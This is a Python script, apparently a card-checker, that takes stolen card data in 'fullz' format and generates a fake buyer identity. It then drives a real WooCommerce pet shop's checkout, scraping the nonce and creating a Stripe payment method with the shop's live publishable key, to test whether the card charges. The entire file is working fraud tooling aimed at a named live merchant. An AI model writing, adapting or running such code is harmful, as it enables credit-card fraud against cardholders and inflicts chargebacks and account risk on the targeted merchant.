import asyncio
import random
import uuid
from fake_useragent import UserAgent
from httpx import AsyncClient, HTTPError, ProxyError
from FUNC.defs import *
from fake_useragent import UserAgent

async def create_cvv_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user_agent = UserAgent().random
        random_data = await get_random_info(session)
        first_name = random_data["fname"]
        last_name = random_data["lname"]
        email = random_data["email"]
        phone = random_data["phone"]
        add1 = random_data["add1"]
        add2 = random_data["add2"]
        city = random_data["city"]
        zip_code = random_data["zip"]
        state = random_data["state"]
        url = "https://mypetcornershop.net/product/18cm-dog-toys-for-large-dogs/"
        headers = {
            "User-Agent": user_agent,
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        # Set up multipart form data
        data = {
            "attribute_pa_color": "carrot",
            "quantity": "1",
            "add-to-cart": "10585",
            "product_id": "10585",
            "variation_id": "10595"
        }
        response = await session.post(url=url, headers=headers, data=data)
        print(response)
        url = "https://mypetcornershop.net/checkout/"
        headers = {
            "User-Agent": user_agent,
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        response = await session.get(url=url, headers=headers)
        # print(response)
        nonce = await find_between(response.text, 'name="woocommerce-process-checkout-nonce" value="', '" />')
        print(nonce)
        url = "https://api.stripe.com/v1/payment_methods"
        data = {
            "type": "card",
            "billing_details[name]": first_name,
            "billing_details[address][line1]": add1,
            "billing_details[address][state]": state,
            "billing_details[address][city]": city,
            "billing_details[address][postal_code]": zip_code,
            "billing_details[address][country]": "US",
            "billing_details[email]": email,
            "billing_details[phone]": phone,
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/d2aea9f03a; stripe-js-v3/d2aea9f03a; split-card-element",
            "referrer": "https://mypetcornershop.net",
            "time_on_page": "415376",
            "key": "pk_live_51Mrn2uCHGzmkQokAV7jOzMTNA8y2vhyo1ZuklTrRdSMTZM3dGcCIrqr7WmFJ6P1nwUJmzJvDy2hcrW17FCmeiRNR00ZD0TmVym"
        }
        response = await session.post(url=url, data=data)
        payment_method_id = response.json().get("id")
        print(payment_method_id)
        url = "https://mypetcornershop.net/?wc-ajax=checkout"
        data = {
            "billing_first_name": first_name,
            "billing_last_name": last_name,
            "billing_company": "",
            "billing_country": "US",
            "billing_address_1": add1,
            "billing_address_2": add2,
            "billing_city": city,
            "billing_state": state,
            "billing_postcode": zip_code,
            "billing_phone": phone,
            "billing_email": email,
            "order_comments": "",
            "payment_method": "stripe",
            "mailpoet_woocommerce_checkout_optin_present": "1",
            "woocommerce-process-checkout-nonce": nonce,
            "_wp_http_referer": "/?wc-ajax=update_order_review",
            "stripe_source": payment_method_id
        }
        result = await session.post(url=url, headers=headers, data=data, timeout=30)
        print(result.text)
        return result

    except Exception as e:
        return str(e)
